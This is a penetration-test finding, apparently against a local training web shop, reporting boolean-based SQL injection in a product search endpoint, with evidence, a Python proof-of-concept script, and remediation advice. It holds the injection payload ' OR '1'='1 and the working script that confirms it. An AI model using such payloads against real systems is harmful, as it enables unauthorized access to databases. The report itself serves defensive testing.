# SQL Injection in Product Search Functionality

**ID:** vuln-0002
**Severity:** MEDIUM
**Found:** 2026-09-04 15:40:42 UTC
**Target:** http://host.docker.internal:3100
**Endpoint:** /rest/products/search
**Method:** GET
**CWE:** CWE-89
**CVSS:** 5.3
**Confidence:** High
**Fix Effort:** Low

## Description

The product search endpoint is vulnerable to boolean-based SQL injection in the query parameter. An attacker can inject SQL operators to bypass search filters and retrieve all products in the database, or potentially extract sensitive information.

## Evidence

Working proof of concept demonstrates successful SQL injection. A GET request with query parameter `' OR '1'='1` returns all 46 products instead of search results. Normal search for "juice" returns 35 results, but the injected query returns all 46 products (matching the total product count from the unfiltered products API).

## Impact

An attacker can bypass search filters to access all products in the database. In a more severe scenario, this could allow extraction of sensitive data from the database such as user credentials, personal information, or financial records if they are stored in related tables.

## Counterevidence

No input validation, escaping, or parameterization was found on the search parameter. The application directly incorporates user input into SQL queries. Multiple SQL injection syntaxes were tested and confirmed working (various OR/AND conditions). No database-level protections or WAF was observed.

## What Would Change This Severity

Could be rated critical if data extraction (UNION-based SQLi) is achieved to retrieve sensitive data from other tables like users or orders.

## Technical Analysis

The search endpoint constructs a SQL query using unsanitized user input from the query parameter. The application likely executes a query like: `SELECT * FROM products WHERE name LIKE '[query]%'`. By injecting `' OR '1'='1`, the query becomes: `SELECT * FROM products WHERE name LIKE '' OR '1'='1'%'` which always evaluates to true, returning all products in the database. The application returns 46 products when querying with the SQLi payload, versus only search-relevant results for normal queries.

## Proof of Concept

1. Make a GET request to `/rest/products/search?q=juice` - observe normal search returns 35 results
2. Get baseline of total products from `/api/products` - total is 46 products
3. Make a GET request to `/rest/products/search?q=' OR '1'='1` - the endpoint now returns all 46 products
4. Verify the SQLi worked by comparing result counts: normal query (35) vs injected query (46)

```python
#!/usr/bin/env python3
import requests

base_url = "http://host.docker.internal:3100"

# Step 1: Get baseline
print("[*] Step 1: Normal search for 'juice'")
resp = requests.get(f"{base_url}/rest/products/search?q=juice")
normal_results = len(resp.json()['data'])
print(f"    Results: {normal_results}")

# Step 2: Get total products
print("[*] Step 2: Get total products")
resp = requests.get(f"{base_url}/api/products")
total_products = len(resp.json()['data'])
print(f"    Total: {total_products}")

# Step 3: SQL injection
print("[*] Step 3: SQL injection payload")
payload = "' OR '1'='1"
resp = requests.get(f"{base_url}/rest/products/search?q={payload}")
sqli_results = len(resp.json()['data'])
print(f"    Results: {sqli_results}")

# Verify
if sqli_results == total_products:
    print(f"\n[+] CONFIRMED: SQL injection retrieved all {total_products} products!")
else:
    print(f"[-] Unexpected results")
```

## Remediation

Implement parameterized queries or prepared statements for the search functionality. The query should use parameter binding: `SELECT * FROM products WHERE name LIKE ? OR description LIKE ?` with the search term passed as a parameter. Additionally, implement input validation to escape or reject SQL special characters like single quotes, and consider using a dedicated search engine like Elasticsearch that handles injection safety automatically.

## Assumptions

Assumes attacker has access to the search endpoint (unauthenticated access). The search functionality is publicly accessible.
